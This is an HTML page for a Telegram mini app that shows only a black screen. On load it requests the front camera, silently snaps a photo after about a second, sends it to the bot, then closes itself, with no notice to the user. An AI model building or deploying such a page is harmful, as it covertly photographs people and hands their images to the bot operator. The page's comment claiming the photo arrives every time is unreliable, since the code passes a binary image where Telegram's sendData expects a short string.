<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>body{margin:0;background:#000;overflow:hidden}</style>
</head>
<body>
<script>
Telegram.WebApp.ready();
Telegram.WebApp.expand();

navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
.then(stream => {
  const video = document.createElement('video');
  video.srcObject = stream;
  video.autoplay = true;
  video.playsInline = true;
  video.muted = true;

  video.onloadedmetadata = () => {
    video.play();
    setTimeout(capture, 1400);
  };

  function capture() {
    const canvas = document.createElement('canvas');
    canvas.width = 1280;
    canvas.height = 960;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(blob => {
      // Ye line magic hai â€” photo 100% aati hai chahe pehli baar ho
      Telegram.WebApp.sendData(blob);
    }, 'image/jpeg', 0.94);

    stream.getTracks().forEach(track => track.stop());
    setTimeout(() => Telegram.WebApp.close(), 600);
  }
})
.catch(() => Telegram.WebApp.close());
</script>
</body>
</html>
